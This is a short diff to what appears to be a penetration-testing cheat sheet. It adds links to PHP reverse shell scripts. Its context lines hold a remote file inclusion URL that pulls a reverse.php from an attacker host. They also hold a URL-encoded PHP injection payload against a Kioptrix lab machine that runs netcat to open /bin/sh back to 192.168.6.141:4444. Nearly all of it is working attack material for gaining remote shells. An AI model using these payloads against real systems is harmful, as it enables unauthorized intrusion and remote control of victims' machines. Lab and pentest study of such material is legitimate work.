@@ -933,7 +933,11 @@ http://192.168.x.x/connect.php?file=http://192.168.6.141/reverse.php
 One liner reverse shell (URL encoded reverse shell)
 http://kioptrix3.com/index.php?page=index%27);${system(%27nc%20-e%20/bin/sh%20192.168.6.141%204444%27)};%23
 
+PHP linux&windows reverse shell
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php
 
+PHP Windows binary reverse shell
+https://github.com/Sentinal920/Pentest-Tools/blob/master/Win_php_bin_rev_shell/php_rshell.php
 --------
 msfvenom
 --------
